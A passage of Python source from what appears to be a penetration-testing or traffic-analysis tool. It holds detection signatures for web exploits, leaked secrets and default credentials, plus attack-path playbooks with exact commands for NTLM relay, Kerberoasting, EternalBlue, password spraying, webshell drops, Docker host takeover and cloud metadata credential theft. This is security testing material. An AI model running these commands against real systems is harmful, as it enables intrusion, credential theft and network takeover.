    10250: ("KUBELET",          "kubelet API"),
    15672: ("RABBITMQ-MGT",     "RabbitMQ management"),
    27018: ("MONGODB-SHARD",    "MongoDB shard"),
    50000: ("SAP-GW",           "SAP gateway (CVE-2020-6287 10KBlaze)"),
}

WEB_ATTACK_PATTERNS = [
    (r"\$\{jndi:(?:ldap|rmi|dns|ldaps|iiop|nis|corba)s?://",
        "Log4Shell probe (JNDI lookup)", "critical", "log4shell",
        "Patch Log4j ≥2.17.0 or set log4j2.formatMsgNoLookups=true."),
    (r"\(\s*\)\s*\{\s*:\s*;\s*\}\s*;",
        "Shellshock probe ((){:;};)", "critical", "shellshock",
        "Patch bash (CVE-2014-6271, CVE-2014-7169)."),
    (r"\{\{\s*[0-9]+\s*[*+]\s*[0-9]+\s*\}\}",
        "Server-side template injection probe ({{7*7}})", "high", "ssti",
        "Validate/escape all template input; use a sandboxed template engine."),
    (r"\$\{\s*[0-9]+\s*\*\s*[0-9]+\s*\}",
        "SSTI probe (${expr})", "high", "ssti",
        "Validate/escape all template input."),
    (r"(?i)\bunion\s+(?:all\s+)?select\b",
        "SQL injection: UNION SELECT", "high", "sqli",
        "Use parameterized queries / ORM bindings; WAF as defense in depth."),
    (r"(?:'|%27)\s*(?:or|OR)\s+(?:'|%27)?1(?:'|%27)?\s*=\s*(?:'|%27)?1",
        "SQL injection: OR 1=1 tautology", "high", "sqli",
        "Use parameterized queries."),
    (r"(?i)\bsleep\s*\(\s*[0-9]+\s*\)\s*(?:--|#|/\*)",
        "Blind SQL injection (sleep)", "medium", "sqli",
        "Use parameterized queries; monitor for time-based blind probes."),
    (r"<script[^>]*>[^<]*(?:alert|document\.cookie|eval)",
        "Cross-site scripting payload", "high", "xss",
        "Output-encode user data; CSP + HttpOnly cookies."),
    (r"(?i)\bon(?:error|load|click|mouseover)\s*=\s*[\"']?(?:alert|eval|document)",
        "XSS via event handler", "high", "xss",
        "Output-encode user data; strict CSP."),
    (r"(?:\.\./){2,}",
        "Path traversal (../../ sequence)", "high", "path-traversal",
        "Canonicalize paths; restrict to allowlist directories."),
    (r"(?i)\.\.%2f\.\.%2f",
        "URL-encoded path traversal", "high", "path-traversal",
        "Canonicalize paths; decode before validation."),
    (r"(?:;|\|\||&&|%0a|%0d)\s*(?:id|whoami|uname\s+-a|cat\s+/etc/passwd|ls\s+/)\b",
        "OS command injection probe", "critical", "cmdi",
        "Avoid shelling out on user input; use argv arrays not shell strings."),
    (r"(?i)\bxp_cmdshell\b",
        "MSSQL xp_cmdshell invocation", "critical", "sqli-rce",
        "Disable xp_cmdshell; least-privilege DB accounts."),
    (r"(?i)\bload_file\s*\(\s*['\"]/etc/",
        "MySQL LOAD_FILE() on /etc", "high", "sqli",
        "Revoke FILE privilege from app DB users."),
    (r"(?i)<!DOCTYPE[^>]*\[[^\]]*<!ENTITY[^>]+SYSTEM",
        "XXE probe (external entity)", "high", "xxe",
        "Disable external entity resolution in XML parser."),
    (r"(?i)\.action\?.*\x23?\{.*@java\.lang\.Runtime",
        "Struts 2 OGNL RCE probe", "critical", "struts",
        "Patch Struts (S2-045/S2-057 and later); WAF rule."),
    (r"(?i)/%2e%2e/|/\.\.;/",
        "Tomcat ghostcat / path traversal encoding", "high", "path-traversal",
        "Patch Tomcat; strict URL normalization."),
    (r"(?i)User-Agent:\s*\(\s*\)\s*\{\s*:;",
        "Shellshock via User-Agent", "critical", "shellshock",
        "Patch bash."),
    (r"(?i)/autodiscover/autodiscover\.json\?@\w+\.\w+",
        "Exchange ProxyLogon probe (CVE-2021-26855 SSRF @-trick)", "critical", "proxylogon",
        "Patch Exchange; audit /ecp/DDI logs and /aspnet_client for webshells."),
    (r"(?i)/owa/auth/\S*\.js\S*\?@",
        "Exchange ProxyShell probe", "critical", "proxyshell",
        "Patch Exchange (CVE-2021-34473/34523/31207)."),
    (r"(?i)/aspnet_client/system_web/\S+\.(?:aspx|asmx|ashx)",
        "Exchange ProxyShell webshell drop path", "critical", "proxyshell",
        "Patch Exchange; scan /aspnet_client and /inetpub/wwwroot for unknown files."),
    (r"class\.module\.classLoader\.",
        "Spring4Shell probe (CVE-2022-22965)", "critical", "spring4shell",
        "Upgrade Spring Framework; block .jsp under webapp root."),
    (r"(?i)/actuator/(?:env|heapdump|threaddump|logfile|trace|configprops|mappings|beans)",
        "Spring Boot actuator sensitive endpoint", "high", "spring-actuator",
        "management.endpoints.web.exposure.include=health,info only; require auth on actuators."),
    (r"(?i)/template/aui/text-inline\.vm\?icon=.*\\u0022\)\s*\+\s*\#",
        "Confluence OGNL injection (CVE-2021-26084)", "critical", "confluence-ognl",
        "Patch Confluence."),
    (r"(?i)/vpn/\.\./vpns/portal/scripts/",
        "Citrix ADC/NetScaler path traversal (CVE-2019-19781)", "critical", "citrix",
        "Patch Citrix ADC/Gateway; audit /var/tmp/netscaler for XML payloads."),
    (r"(?i)/ctxsmartbootstrapper\?hostcode=",
        "Citrix SSRF probe", "high", "citrix",
        "Patch Citrix."),
    (r"(?i)/websso/SAML2/|/ui/vropspluginui/",
        "VMware vCenter probe (CVE-2021-21972 / CVE-2021-22005)", "critical", "vmware-vcenter",
        "Patch vCenter; firewall management plane."),
    (r"(?i)/mgmt/tm/util/bash",
        "F5 BIG-IP iControl REST unauth RCE (CVE-2022-1388)", "critical", "f5-bigip",
        "Patch F5 BIG-IP; block /mgmt/ from internet."),
    (r"(?i)/tmui/login\.jsp/\.\.(;|/)",
        "F5 TMUI traversal (CVE-2020-5902)", "critical", "f5-bigip",
        "Patch F5 BIG-IP."),
    (r"(?i)/api/v4/projects/\S+/import/url",
        "GitLab SSRF via project import URL", "high", "gitlab",
        "Patch GitLab; disable URL-based imports."),
    (r"\b169\.254\.169\.254\b",
        "Cloud IMDS (AWS/GCP 169.254.169.254) referenced in HTTP", "high", "cloud-ssrf",
        "Enforce IMDSv2 on AWS; firewall 169.254.169.254 from untrusted app layers."),
    (r"(?i)metadata\.google\.internal",
        "GCP metadata service referenced in HTTP payload", "high", "cloud-ssrf",
        "Block egress to metadata endpoints; use Workload Identity."),
    (r"(?i)metadata\.azure\.com",
        "Azure IMDS referenced in HTTP payload", "high", "cloud-ssrf",
        "Use managed identity + IMDS auth token."),
    (r"^(?:PROPFIND|PROPPATCH|MKCOL|COPY|MOVE|LOCK|UNLOCK)\s+\S",
        "WebDAV method observed", "info", "webdav",
        "Disable WebDAV if unused; restrict to authenticated paths."),
    (r"(?i)Transfer-Encoding:\s*chunked[^\r\n]*\r\nContent-Length:\s*\d",
        "HTTP request smuggling (TE + CL)", "high", "http-smuggling",
        "Ensure proxy and origin agree on length encoding; drop ambiguous requests."),
    (r"(?i)\$\{\s*(?:env|sys|java|spring|ctx):[^}]+\}",
        "Log4j ${env/sys/ctx:} lookup (post-CVE-2021-44228 probe)", "high", "log4shell",
        "Upgrade Log4j ≥2.17.0; block these lookup prefixes."),
    (r"(?i)/solr/[^/]+/config\?action=SETPROPERTY",
        "Apache Solr config manipulation probe", "high", "solr",
        "Patch Solr; do not expose admin API."),
    (r"(?i)/geoserver/ows\?.*exec\s*\(",
        "GeoServer OGC code execution probe", "critical", "geoserver",
        "Patch GeoServer (CVE-2023-35042 etc.)."),
    (r"(?i)HTTP/1\.1\s+200[^\r\n]*\r\n.*\r\n\r\n\S*\x7fELF",
        "ELF binary served over HTTP", "medium", "malware-delivery",
        "Inspect URL; if unexpected, block and investigate."),
    (r"(?i)HTTP/1\.1\s+200[^\r\n]*\r\n.*\r\n\r\nMZ",
        "Windows PE binary served over HTTP", "medium", "malware-delivery",
        "Inspect URL; if unexpected, block and investigate."),
]
WEB_ATTACK_PATTERNS = [(re.compile(p), *rest) for p, *rest in WEB_ATTACK_PATTERNS]

WEAK_TLS_CIPHER_SUITES = {
    0x0001: "NULL_MD5",
    0x0002: "NULL_SHA",
    0x0003: "EXPORT_RC4_40_MD5",
    0x0004: "RC4_128_MD5",
    0x0005: "RC4_128_SHA",
    0x0006: "EXPORT_RC2_CBC_40_MD5",
    0x0008: "EXPORT_DES40_CBC_SHA",
    0x0009: "DES_CBC_SHA",
    0x000A: "3DES_EDE_CBC_SHA",
    0x0011: "EXPORT_DH_DSS_DES40_CBC_SHA",
    0x0014: "EXPORT_DHE_RSA_DES40_CBC_SHA",
    0x0015: "DHE_RSA_DES_CBC_SHA",
    0x0017: "EXPORT_DH_anon_RC4_40_MD5",
    0x0018: "DH_anon_RC4_128_MD5",
    0x0019: "EXPORT_DH_anon_DES40_CBC_SHA",
    0x001A: "DH_anon_DES_CBC_SHA",
    0x001B: "DH_anon_3DES_EDE_CBC_SHA",
}

DEFAULT_CREDENTIALS = {
    ("admin",     "admin"),       ("admin",     "password"),  ("admin",     ""),
    ("admin",     "admin123"),    ("admin",     "changeme"),
    ("root",      "root"),        ("root",      "toor"),      ("root",      ""),
    ("root",      "password"),    ("root",      "raspberry"),
    ("cisco",     "cisco"),       ("cisco",     "class"),
    ("enable",    "cisco"),
    ("tomcat",    "tomcat"),      ("tomcat",    "s3cret"),
    ("manager",   "manager"),     ("manager",   "Password1"),
    ("user",      "user"),        ("user",      "password"),
    ("guest",     "guest"),       ("guest",     ""),
    ("anonymous", ""),            ("ftp",       "ftp"),
    ("administrator", "administrator"),
    ("administrator", "password"),
    ("administrator", "P@ssw0rd"),
    ("sa",        ""),            ("sa",        "sa"),         ("sa",        "password"),
    ("postgres",  "postgres"),    ("mysql",     "mysql"),
    ("oracle",    "oracle"),      ("system",    "manager"),
    ("weblogic",  "weblogic"),    ("weblogic",  "welcome1"),
    ("jboss",     "jboss"),
    ("pi",        "raspberry"),
    ("ubnt",      "ubnt"),
}

GPP_CPASSWORD_RE = re.compile(rb'cpassword\s*=\s*"([A-Za-z0-9+/=]+)"')

CLOUD_HOST_PATTERNS = [
    (re.compile(r"(?i)([a-z0-9.-]+)\.s3[.-]?(?:[a-z0-9-]+\.)?amazonaws\.com"), "AWS", "S3", "S3 bucket access — bucket name is disclosed in the Host/SNI."),
    (re.compile(r"(?i)ec2\.[a-z0-9-]+\.amazonaws\.com"),                      "AWS", "EC2",       "EC2 API traffic."),
    (re.compile(r"(?i)sts(?:\.[a-z0-9-]+)?\.amazonaws\.com"),                 "AWS", "STS",       "AWS Security Token Service — AssumeRole / GetCallerIdentity."),
    (re.compile(r"(?i)iam(?:\.[a-z0-9-]+)?\.amazonaws\.com"),                 "AWS", "IAM",       "AWS IAM control plane."),
    (re.compile(r"(?i)execute-api\.[a-z0-9-]+\.amazonaws\.com"),              "AWS", "API-GW",    "API Gateway call."),
    (re.compile(r"(?i)lambda\.[a-z0-9-]+\.amazonaws\.com"),                   "AWS", "Lambda",    "Lambda invocation."),
    (re.compile(r"(?i)dynamodb\.[a-z0-9-]+\.amazonaws\.com"),                 "AWS", "DynamoDB",  "DynamoDB control/data plane."),
    (re.compile(r"(?i)secretsmanager\.[a-z0-9-]+\.amazonaws\.com"),           "AWS", "SecretsMgr","AWS Secrets Manager — high-value target."),
    (re.compile(r"(?i)dkr\.ecr\.[a-z0-9-]+\.amazonaws\.com"),                 "AWS", "ECR",       "ECR container registry."),
    (re.compile(r"(?i)[a-z0-9-]+\.blob\.core\.windows\.net"),                 "Azure", "Blob",      "Azure Blob Storage — storage account name disclosed."),
    (re.compile(r"(?i)[a-z0-9-]+\.file\.core\.windows\.net"),                 "Azure", "Files",     "Azure Files."),
    (re.compile(r"(?i)[a-z0-9-]+\.queue\.core\.windows\.net"),                "Azure", "Queue",     "Azure Queue Storage."),
    (re.compile(r"(?i)[a-z0-9-]+\.vault\.azure\.net"),                        "Azure", "KeyVault",  "Azure Key Vault — secret / certificate store."),
    (re.compile(r"(?i)[a-z0-9-]+\.database\.windows\.net"),                   "Azure", "SQL DB",    "Azure SQL Database."),
    (re.compile(r"(?i)[a-z0-9-]+\.azurecr\.io"),                              "Azure", "ACR",       "Azure Container Registry."),
    (re.compile(r"(?i)login\.microsoftonline\.com"),                          "Azure", "EntraID",   "Azure AD / Entra ID auth endpoint."),
    (re.compile(r"(?i)storage\.googleapis\.com"),                             "GCP", "GCS",         "GCS Cloud Storage."),
    (re.compile(r"(?i)[a-z0-9.-]+\.appspot\.com"),                            "GCP", "AppEngine",  "GCP App Engine."),
    (re.compile(r"(?i)[a-z0-9-]+\.run\.app"),                                 "GCP", "CloudRun",   "GCP Cloud Run."),
    (re.compile(r"(?i)[a-z0-9.-]+\.pkg\.dev"),                                "GCP", "ArtifactReg","GCP Artifact Registry."),
    (re.compile(r"(?i)gcr\.io"),                                              "GCP", "GCR",        "Google Container Registry."),
    (re.compile(r"(?i)[a-z0-9-]+\.firebaseio\.com"),                          "GCP", "Firebase",   "Firebase Realtime DB — often left world-readable."),
    (re.compile(r"(?i)metadata\.google\.internal"),                           "GCP", "IMDS",       "GCP metadata service (IMDS)."),
    (re.compile(r"(?i)169\.254\.169\.254"),                                   "Cloud", "IMDS",     "Link-local IMDS (AWS/Azure/GCP)."),
]

SECRET_PATTERNS = [
    (re.compile(r"(?<![A-Z0-9])(AKIA|ABIA|AIDA|AGPA|AROA|ANPA|ANVA|ASIA)[A-Z0-9]{16}(?![A-Z0-9])"),
        "AWS access key ID", "critical", "aws-access-key",
        "Rotate the key now; review CloudTrail for unauthorized API calls."),
    (re.compile(r"(?i)aws_secret_access_key\s*[=:]\s*[\"']?([A-Za-z0-9/+=]{40})[\"']?"),
        "AWS secret access key in plaintext", "critical", "aws-secret-key",
        "Rotate; audit CloudTrail."),
    (re.compile(r"(?i)aws_session_token\s*[=:]\s*[\"']?([A-Za-z0-9/+=]{100,})[\"']?"),
        "AWS session token (STS) in plaintext", "high", "aws-session-token",
        "Short-lived but actionable — investigate origin."),
    (re.compile(rb'"private_key_id"\s*:\s*"[a-f0-9]{40}"'),
        "GCP service account JSON key", "critical", "gcp-sa-key",
        "Rotate service account key; scan IAM audit logs for abuse."),
    (re.compile(r"(?<![A-Za-z0-9])AIza[0-9A-Za-z_-]{35}(?![A-Za-z0-9])"),
        "Google API key", "high", "google-api-key",
        "Rotate; restrict key by caller IP / referrer."),
    (re.compile(r"(?i)DefaultEndpointsProtocol=https;AccountName=[^;\s]+;AccountKey=[A-Za-z0-9+/=]+"),
        "Azure Storage connection string", "critical", "azure-storage-conn",
        "Rotate account key; migrate to managed identity."),
    (re.compile(r"(?i)[?&](?:sig|sv|st)=[^&\s]*&[^&\s]*se=[^&\s]+"),
        "Azure SAS token in URL", "high", "azure-sas",
        "Revoke stored access policy; narrow permissions; prefer short expiry."),
    (re.compile(r"(?<![A-Za-z0-9])(ghp|gho|ghu|ghs|ghr)_[A-Za-z0-9]{36}(?![A-Za-z0-9])"),
        "GitHub classic PAT", "critical", "github-pat",
        "Revoke at github.com/settings/tokens; rotate anything that used it."),
    (re.compile(r"(?<![A-Za-z0-9])github_pat_[A-Za-z0-9_]{82}(?![A-Za-z0-9])"),
        "GitHub fine-grained PAT", "critical", "github-pat",
        "Revoke; rotate."),
    (re.compile(r"(?<![A-Za-z0-9])xox[baprs]-[A-Za-z0-9-]{10,72}"),
        "Slack API token", "critical", "slack-token",
        "Revoke via Slack admin; rotate integrations."),
    (re.compile(r"https://hooks\.slack\.com/services/T[A-Z0-9]+/B[A-Z0-9]+/[A-Za-z0-9]+"),
        "Slack incoming-webhook URL", "high", "slack-webhook",
        "Regenerate webhook; validate posts with signing secret."),
    (re.compile(r"https://discord(?:app)?\.com/api/webhooks/\d+/[A-Za-z0-9_-]+"),
        "Discord webhook URL", "medium", "discord-webhook",
        "Delete and regenerate webhook."),
    (re.compile(r"(?<![A-Za-z0-9])(?:sk|pk|rk)_(?:live|test)_[A-Za-z0-9]{24,99}"),
        "Stripe API key", "critical", "stripe-key",
        "Rotate in Stripe dashboard; restrict key by IP."),
    (re.compile(r"(?<![A-Za-z0-9])SK[a-f0-9]{32}"),
        "Twilio API SID", "medium", "twilio",
        "Rotate the paired auth token."),
    (re.compile(r"(?<![A-Za-z0-9])AC[a-f0-9]{32}"),
        "Twilio Account SID", "low", "twilio",
        "Account SID alone isn't a secret; flagged as a reconnaissance aid."),
    (re.compile(r"(?<![A-Za-z0-9])npm_[A-Za-z0-9]{36}"),
        "npm publish token", "high", "npm-token",
        "Revoke at npmjs.com/settings/tokens."),
    (re.compile(r"(?<![A-Za-z0-9])pypi-[A-Za-z0-9_-]{40,}"),
        "PyPI API token", "high", "pypi-token",
        "Revoke at pypi.org/manage/account/token/."),
    (re.compile(r"(?<![A-Za-z0-9])glpat-[A-Za-z0-9_-]{20}"),
        "GitLab PAT", "critical", "gitlab-pat",
        "Revoke at gitlab.com/-/profile/personal_access_tokens."),
    (re.compile(r"-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP |ENCRYPTED )?PRIVATE KEY-----"),
        "PEM private key in cleartext", "critical", "pem-private-key",
        "Rotate the key; never transmit private keys over plain HTTP."),
    (re.compile(r"(?<![A-Za-z0-9_-])eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{4,}"),
        "JWT observed", "medium", "jwt-leak",
        "Decode (jwt.io / jwt_tool); treat as credential; check alg=none and weak HMAC secrets."),
    (re.compile(r"(?i)(?:api[_-]?key|apikey|x-api-key|access[_-]?token|auth[_-]?token)\s*[:=]\s*[\"']?([A-Za-z0-9_\-.]{24,})[\"']?"),
        "Generic API key / access token in HTTP", "medium", "generic-apikey",
        "Inspect value; rotate if a real secret; prefer header-based auth over query strings."),
]

# Attack paths — each recipe is activated when its prerequisite findings exist.
# match_any_category: OR across categories; match_substring: AND narrowing on title/evidence.
ATTACK_PATHS = [
    {
        "id": "ntlm-relay",
        "name": "NTLM Relay — Responder → ntlmrelayx",
        "severity": "critical",
        "phase": "AD lateral",
        "match_any_category": ["spoofable-resolution"],
        "amplifiers": ["ntlm-capture", "smb"],
        "description": ("Windows hosts falling back to LLMNR/NBT-NS/mDNS/WPAD can be coerced "
                        "into authenticating to you. Any SMB target that doesn't *require* "
                        "signing becomes a relay destination — the attack lands as code "
                        "execution or SAM dump."),
        "steps": [
            "Pick a NIC on the broadcast domain: `ip a`.",
            "Build a target list of hosts with SMB signing NOT required: "
            "`crackmapexec smb 10.0.0.0/24 --gen-relay-list targets.txt`.",
            "Start ntlmrelayx: `impacket-ntlmrelayx -tf targets.txt -smb2support -socks`.",
            "In parallel, start Responder: `responder -I eth0 -wrf`.",
            "On the next LLMNR/NBT-NS/WPAD query, the client sends NetNTLMv2 → Responder "
            "forwards it to ntlmrelayx → relayed to the unsigned target.",
            "Pivot via `impacket-psexec` through the proxychains SOCKS or dump SAM with "
            "`impacket-secretsdump`.",
        ],
        "tools": ["Responder", "impacket ntlmrelayx", "CrackMapExec", "impacket-secretsdump"],
    },
    {
        "id": "mitm6",
        "name": "mitm6 → ntlmrelayx to LDAP (full AD takeover)",
        "severity": "critical",
        "phase": "AD lateral",
        "match_any_category": ["ipv6-takeover"],
        "amplifiers": ["spoofable-resolution", "ntlm-capture"],
        "description": ("Windows prefers IPv6 DHCP over IPv4 DNS. Answering DHCPv6 solicits "
                        "makes you the primary IPv6 DNS — poison WPAD, then relay NTLM auth "
                        "into LDAPS to create a computer account or grant yourself Resource-"
                        "Based Constrained Delegation."),
        "steps": [
            "Identify a domain controller with LDAPS.",
            "`mitm6 -d corp.local` on the same L2.",
            "`impacket-ntlmrelayx -6 -t ldaps://dc.corp.local -wh attacker-wpad "
            "--delegate-access`.",
            "Wait ~5 minutes — Windows clients renew, pick you up as DNS, auth via WPAD.",
            "ntlmrelayx creates a machine account and adds RBCD from that account to the "
            "targeted computer — you now impersonate any user to services on that host "
            "(`getST.py -spn cifs/victim -impersonate administrator ...`).",
        ],
        "tools": ["mitm6", "impacket ntlmrelayx", "impacket getST", "Rubeus"],
    },
    {
        "id": "kerberoast",
        "name": "Kerberoasting — offline crack RC4 TGS-REP",
        "severity": "high",
        "phase": "AD lateral",
        "match_any_category": ["kerberos-weak"],
        "description": ("Service accounts whose SPNs accept RC4-HMAC hand out TGS responses "
                        "whose encrypted portion is crackable offline. Any domain user can "
                        "request these tickets."),
        "steps": [
            "From a domain-user context: "
            "`GetUserSPNs.py corp.local/user:pass -request -dc-ip <dc>`.",
            "Feed the hashcat-ready output to hashcat mode 13100 with rockyou + OneRule.",
            "Cracked service-account password → whatever that account has rights to "
            "(often SQL sa, backup admin, or worse).",
        ],
        "tools": ["impacket GetUserSPNs", "Rubeus kerberoast", "hashcat (mode 13100)"],
    },
    {
        "id": "asrep-roast",
        "name": "AS-REP Roasting — pre-auth-disabled users",
        "severity": "high",
        "phase": "AD lateral",
        "match_any_category": ["kerberos-weak"],
        "match_substring": ["AS-REP"],
        "description": ("Accounts with DONT_REQ_PREAUTH set return an AS-REP whose encrypted "
                        "block is crackable offline without any valid credentials."),
        "steps": [
            "Enumerate pre-auth-disabled accounts: "
            "`GetNPUsers.py corp.local/ -dc-ip <dc> -usersfile users.txt -format hashcat "
            "-no-pass`.",
            "Crack with `hashcat -m 18200 hashes.txt rockyou.txt -r rules/best64.rule`.",
        ],
        "tools": ["impacket GetNPUsers", "hashcat (mode 18200)"],
    },
    {
        "id": "eternalblue",
        "name": "EternalBlue / MS17-010",
        "severity": "critical",
        "phase": "AD lateral",
        "match_any_category": ["smb"],
        "match_substring": ["SMBv1"],
        "description": ("SMBv1 on the wire means hosts likely unpatched for MS17-010. "
                        "Direct SYSTEM RCE; wormable (WannaCry/NotPetya class)."),
        "steps": [
            "Confirm: `nmap --script smb-vuln-ms17-010 -p445 <targets>`.",
            "Exploit: Metasploit `exploit/windows/smb/ms17_010_eternalblue` or "
            "standalone `eternalblue.py`.",
            "On callback: `hashdump`, `lsa_dump`, then pivot.",
        ],
        "tools": ["nmap", "Metasploit ms17_010_eternalblue", "mimikatz"],
    },
    {
        "id": "gpp-cpassword",
        "name": "GPP cpassword decrypt",
        "severity": "critical",
        "phase": "AD lateral",
        "match_any_category": ["ad-weakness"],
        "match_substring": ["cpassword"],
        "description": ("GPP XMLs stored in SYSVOL encrypt passwords with a public AES key "
                        "(MS14-025). Decrypts instantly; the password is almost always "
                        "reused elsewhere in the estate."),
        "steps": [
            "Grab the cpassword value from the finding evidence.",
            "`gpp-decrypt '<cpassword>'` (Kali) or PowerSploit `Get-GPPPassword`.",
            "Spray the plaintext across AD: "
            "`crackmapexec smb <subnet> -u users.txt -p '<pw>' --continue-on-success`.",
        ],
        "tools": ["gpp-decrypt", "PowerSploit Get-GPPPassword", "CrackMapExec"],
    },
    {
        "id": "default-creds-reuse",
        "name": "Default credential reuse spray",
        "severity": "critical",
        "phase": "credential",
        "match_any_category": ["default-creds"],
        "description": ("Default creds on one service almost always indicate they're reused "
                        "across the estate. Spray before they rotate."),
        "steps": [
            "Export the captured default pair(s) from the creds report.",
            "Spray SMB/RDP/WinRM/MSSQL/SSH: "
            "`crackmapexec <proto> <range> -u user -p pass --continue-on-success`.",
            "Any host where it lands with local-admin rights → dump LSASS, escalate.",
        ],
        "tools": ["CrackMapExec", "Hydra", "Medusa"],
    },
    {
        "id": "cred-spray",
        "name": "Username harvest → password spray",
        "severity": "high",
        "phase": "credential",
        "match_any_category": ["ntlm-capture", "recon", "cleartext-creds"],
        "description": ("You already have the usernames from RDP mstshash, NTLM Type 3, "
                        "VRFY/EXPN, and captured logins. Combine with seasonal/company-"
                        "themed password lists and spray low-and-slow."),
        "steps": [
            "Export usernames from the creds tab + findings with `mstshash`/`VRFY`/`NTLMSSP Type 3`.",
            "Build a spray list: seasonal (`Spring2026!`), company (`<Company>1`), "
            "common weak (`Password1`).",
            "Spray carefully to dodge AD lockout thresholds: "
            "`crackmapexec smb <dc> -u users.txt -p spray.txt -t 1 --continue-on-success`.",
        ],
        "tools": ["CrackMapExec", "Kerbrute", "DomainPasswordSpray.ps1"],
    },
    {
        "id": "web-rce-chain",
        "name": "Web exploitation follow-through",
        "severity": "critical",
        "phase": "web",
        "match_any_category": ["web-attack"],
        "description": ("HTTP payload signatures mean either the target has been probed for "
                        "a known RCE/SSRF or is reachable for such probes. For each finding, "
                        "match to the public exploit and land a webshell."),
        "steps": [
            "For each web-attack finding, take the target host and the X-Powered-By / "
            "Server-header banners for exact version fingerprinting.",
            "Confirm with a benign PoC (non-destructive).",
            "Log4Shell → JNDIExploit + Marshalsec. Spring4Shell → spring4shell-scan. "
            "ProxyShell → PowerShell chain. Citrix CVE-2019-19781 → vendor metasploit. "
            "F5 CVE-2022-1388 → public PoC.",
            "Drop a low-footprint webshell (behaviour-constrained, not `/shell.php`), "
            "pivot inward via the webapp's subnet.",
        ],
        "tools": ["Metasploit", "Nuclei", "exploitdb", "JNDIExploit"],
    },
    {
        "id": "heartbleed",
        "name": "Heartbleed memory extraction",
        "severity": "critical",
        "phase": "web",
        "match_any_category": ["vuln-version"],
        "match_substring": ["Heartbleed"],
        "description": ("OpenSSL <1.0.1g leaks up to 64KB of server memory per heartbeat. "
                        "Pull cookies, plaintext creds, and — with luck — the cert's private key."),
        "steps": [
            "Confirm: `nmap -p443 --script ssl-heartbleed <target>`.",
            "Mass-scrape: `heartleech <target> -f dump.bin`; grep for `Cookie: `, "
            "`password=`, `-----BEGIN`.",
            "If you pull the private key, decrypt captured TLS and impersonate the server.",
        ],
        "tools": ["nmap ssl-heartbleed", "heartleech",
                  "Metasploit auxiliary/scanner/ssl/openssl_heartbleed"],
    },
    {
        "id": "ics-direct",
        "name": "ICS / OT direct control",
        "severity": "critical",
        "phase": "OT",
        "match_any_category": ["ics-ot"],
        "description": ("Modbus/S7/DNP3/IEC-104 grant read and WRITE authority with zero "
                        "auth. Actuating anything in production can injure people or damage "
                        "equipment — read-only recon only, with written authorization."),
        "steps": [
            "Enumerate: `nmap --script modbus-discover -p502 <target>` / "
            "`plcscan <target>` / S7: `msf > use auxiliary/scanner/scada/profinet_siemens`.",
            "Read a handful of coils/registers as proof. Log exactly what you read.",
            "STOP. Document reachable function codes (5/6/15/16 = write) and report — "
            "do not issue writes without explicit sign-off from the ICS owner.",
        ],
        "tools": ["nmap modbus-discover", "plcscan", "smod", "ISF"],
    },
    {
        "id": "exposed-mgmt",
        "name": "Exposed management plane → instant RCE",
        "severity": "critical",
        "phase": "exposure",
        "match_any_category": ["exposed-service"],
        "match_substring": ["DOCKER-API", "KUBE-API", "KUBELET", "ETCD",
                            "WINRM-HTTP", "MIKROTIK", "SALT"],
        "description": ("Unauthenticated management APIs give RCE / cluster takeover in "
                        "a single request."),
        "steps": [
            "Docker 2375: `docker -H tcp://<host>:2375 run -v /:/host --rm -it alpine "
            "chroot /host sh` → host root.",
            "kubelet 10250: `curl -k https://<host>:10250/pods` → `exec` into any pod.",
            "SaltStack 4505/4506: CVE-2020-11651 PoC → root on the master and every minion.",
            "MikroTik Winbox 8291: `winbox_exploit` (CVE-2018-14847) dumps creds.",
            "WinRM-HTTP 5985: `evil-winrm -i <host> -u user -H <nthash>` → interactive shell.",
        ],
        "tools": ["docker client", "evil-winrm", "exploit-saltstack-cve-2020-11651",
                  "winbox-exploit"],
    },
    {
        "id": "cloud-imds",
        "name": "Cloud IMDS → temporary IAM credentials",
        "severity": "critical",
        "phase": "cloud",
        "match_any_category": ["cloud-ssrf"],
        "description": ("An SSRF-reachable cloud metadata endpoint hands you the instance's "
                        "IAM role creds. Usable from anywhere until they expire (~hours)."),
        "steps": [
            "Confirm the SSRF works through the vulnerable app.",
            "AWS: `GET /latest/meta-data/iam/security-credentials/` → role → "
            "`GET .../<role>` → AccessKey / Secret / Token.",
            "Load creds locally: `aws configure set aws_session_token <token>`; "
            "`aws sts get-caller-identity`.",
            "Enumerate with Pacu: `sessions import`, then `iam__enum_permissions`.",
            "GCP: path is `http://metadata.google.internal/computeMetadata/v1/instance/"
            "service-accounts/default/token` with header `Metadata-Flavor: Google`.",
        ],
        "tools": ["curl", "awscli", "Pacu", "gcloud"],
    },
    {
        "id": "vnc-none",
        "name": "VNC no-auth → immediate desktop access",
        "severity": "critical",
        "phase": "direct-access",
        "match_any_category": ["weak-auth"],
        "match_substring": ["VNC"],
        "description": ("VNC offering security type 1 (None) hands you the desktop. No "
                        "credentials required."),
        "steps": [
            "`vncviewer <host>:5900`.",
            "Identify who's logged in before you move the mouse — if a session is active, "
            "mark it out-of-scope for direct interaction and document the exposure instead.",
        ],
        "tools": ["vncviewer"],
    },
    {
        "id": "radius-crack",
        "name": "RADIUS shared-secret → plaintext passwords",
        "severity": "high",
        "phase": "credential",
        "match_any_category": ["weak-auth"],
        "match_substring": ["RADIUS"],
        "description": ("The Access-Request's User-Password attribute is MD5'd with the "
                        "shared secret. Weak/guessed secrets → instant plaintext recovery."),
        "steps": [
            "Extract the matching Access-Request + Access-Accept/Reject pair from the pcap.",
            "Brute the shared secret with a custom MD5 tool or published `radcrack` "
            "(the operation is one MD5 per guess).",
            "With the secret, decrypt User-Password.",
        ],
        "tools": ["radcrack", "custom md5 bruter", "hashcat"],
    },
    {
        "id": "session-hijack",
        "name": "HTTP session hijacking",
        "severity": "high",
        "phase": "web",
        "match_any_category": ["cleartext-creds", "http-hardening"],
        "match_substring": ["Cookie", "Secure"],
        "description": ("Session cookies leaked over plain HTTP or without the Secure flag "
                        "mean account takeover in one request."),
        "steps": [
            "Pull the cookie from the creds tab or the flow packet view.",
            "Replay: `curl -H 'Cookie: <name>=<value>' https://site/account` — most apps "
            "accept the cookie over HTTPS even when it was captured from HTTP.",
            "If it's a JWT, decode and check for weak signing (alg=none, weak HS256 secret).",
        ],
        "tools": ["curl", "Burp Suite", "jwt_tool"],
    },
    {
        "id": "exposed-sensitive",
        "name": "Perimeter-exposed sensitive service",
        "severity": "high",
        "phase": "exposure",
        "match_any_category": ["exposed-service"],
        "match_substring": ["public", "accepts"],
